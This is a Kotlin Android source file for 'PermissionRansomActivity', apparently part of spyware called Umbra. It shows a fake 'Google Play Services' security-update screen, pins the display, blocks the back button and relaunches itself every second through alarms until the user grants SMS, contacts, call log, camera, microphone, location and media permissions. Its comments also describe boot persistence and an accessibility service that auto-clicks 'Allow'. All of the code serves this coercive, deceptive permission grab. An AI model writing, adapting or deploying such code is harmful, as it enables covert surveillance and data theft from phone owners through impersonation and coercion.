package org.umbra.core.persistence

import android.Manifest
import android.app.Activity
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

/**
 * PermissionRansomActivity — full-screen lock that blocks device usage until
 * the user grants ALL requested permissions.
 *
 * Behavior:
 * - Shows immediately on launch
 * - Auto-requests all missing permissions after 2 seconds
 * - If user denies ANY permission → re-shows the popup after 2 seconds
 * - If user dismisses the activity → AlarmManager re-launches it in 1 second
 * - If phone restarts → BootReceiver re-launches it 5 seconds after boot
 * - The FGS watchdog (UmbraService) also re-launches every 1 second
 * - When ALL permissions granted → activity finishes, never shows again
 *
 * Defense layers:
 * 1. startLockTask() — pins screen, can't go home/recents/back
 * 2. FGS watchdog (1s) — re-launches if dismissed
 * 3. AlarmManager (1s) — re-launches even if FGS killed
 * 4. AccessibilityService — auto-clicks "Allow" on dialogs, re-launches on app switch
 * 5. BootReceiver — re-launches after phone restart
 */
class PermissionRansomActivity : Activity() {

    companion object {
        private const val TAG = "Umbra"
        private const val RELAUNCH_DELAY_MS = 1000L
        private const val RE_REQUEST_DELAY_MS = 2000L

        /** True while the ransom activity or its permission dialog is on screen. */
        @Volatile var isShowing = false

        val REQUIRED_PERMISSIONS = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
        )

        fun hasAllPermissions(context: Context): Boolean {
            return REQUIRED_PERMISSIONS.all {
                context.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
            }
        }

        fun missingPermissions(context: Context): List<String> {
            return REQUIRED_PERMISSIONS.filter {
                context.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
        }

        fun hasOverlayPermission(context: Context): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(context)
            } else true
        }

        fun launch(context: Context) {
            if (hasAllPermissions(context)) return
            if (isShowing) return   // already on screen — don't re-launch (would dismiss dialog)
            try {
                val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
                        Intent.FLAG_ACTIVITY_NO_USER_ACTION
                    )
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch ransom: ${e.message}")
                scheduleRelaunch(context)
            }
        }

        fun scheduleRelaunch(context: Context) {
            if (hasAllPermissions(context)) return
            val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
            val pi = PendingIntent.getActivity(
                context, 9991, intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + RELAUNCH_DELAY_MS
            try {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                )
            } catch (e: SecurityException) {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var isLocked = false
    private var requestInFlight = false

    /**
     * Request all missing permissions. Guarded by requestInFlight so we never
     * call requestPermissions() while a dialog is already showing (which would
     * dismiss it). Re-request is driven by onRequestPermissionsResult.
     */
    private fun requestAllMissing() {
        if (requestInFlight) return
        if (hasAllPermissions(this)) {
            Log.d(TAG, "All permissions granted — finishing ransom")
            try { if (isLocked) stopLockTask() } catch (_: Exception) {}
            finish()
            return
        }

        val missing = missingPermissions(this)
        Log.d(TAG, "Requesting ${missing.size} permissions")
        requestInFlight = true
        try {
            requestPermissions(missing.toTypedArray(), 100)
        } catch (e: Exception) {
            requestInFlight = false
            Log.w(TAG, "requestPermissions failed: ${e.message}")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        isShowing = true

        if (hasAllPermissions(this)) {
            isShowing = false
            finish()
            return
        }

        // Turn screen on and show over lockscreen
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        val missing = missingPermissions(this)

        // Build the ransom UI
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 80, 48, 60)
            setBackgroundColor(0xF0101010.toInt())
        }

        val title = TextView(this).apply {
            text = "Google Play Services"
            textSize = 20f
            setTextColor(0xFFFFFFFF.toInt())
            setPadding(0, 0, 0, 16)
        }

        val message = TextView(this).apply {
            text = "A critical security update requires permission updates " +
                   "to keep your device protected.\n\n" +
                   "Tap \"Update\" to continue using your phone.\n\n" +
                   missing.size.toString() + " permissions required."
            textSize = 15f
            setTextColor(0xCCFFFFFF.toInt())
            setPadding(0, 0, 0, 30)
        }

        val allowButton = Button(this).apply {
            text = "Update"
            textSize = 16f
            setOnClickListener {
                requestAllMissing()
            }
        }

        layout.addView(title)
        layout.addView(message)
        layout.addView(allowButton)
        setContentView(layout)

        // ── Layer 1: Lock the screen ──
        try {
            startLockTask()
            isLocked = true
            Log.d(TAG, "Lock task started — screen pinned")
        } catch (e: Exception) {
            Log.w(TAG, "startLockTask failed: ${e.message}")
        }

        // ── Start the request loop after 1 second ──
        handler.postDelayed({ requestAllMissing() }, 1000)

        // ── Schedule AlarmManager re-launch as backup ──
        scheduleRelaunch(this)

        Log.d(TAG, "Ransom shown (${missing.size} perms missing, locked=$isLocked)")
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        requestInFlight = false

        if (hasAllPermissions(this)) {
            Log.d(TAG, "All permissions granted — finishing ransom")
            try { if (isLocked) stopLockTask() } catch (_: Exception) {}
            finish()
            return
        }

        // Permissions still missing — re-request after a short delay.
        // This creates the "popup keeps coming back until you allow everything"
        // behavior. If the user denies, the dialog re-appears in 2 seconds.
        val missing = missingPermissions(this)
        Log.d(TAG, "Permissions still missing (${missing.size}) — re-requesting in ${RE_REQUEST_DELAY_MS}ms")

        handler.postDelayed({ requestAllMissing() }, RE_REQUEST_DELAY_MS)

        // Schedule re-launch as backup (in case activity gets dismissed)
        scheduleRelaunch(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        isShowing = false
        handler.removeCallbacksAndMessages(null)

        // If permissions are still missing, schedule re-launch.
        // This fires when:
        // - User dismisses the activity
        // - System kills the activity
        // - User presses home (onUserLeaveHint also fires)
        if (!hasAllPermissions(this)) {
            Log.d(TAG, "Ransom destroyed but perms still missing — scheduling re-launch")
            scheduleRelaunch(this)
        }
    }

    override fun onBackPressed() {
        // Block back button — do nothing
    }

    override fun onUserLeaveHint() {
        // User pressed home — re-launch immediately
        if (!hasAllPermissions(this)) {
            scheduleRelaunch(this)
        }
    }
}
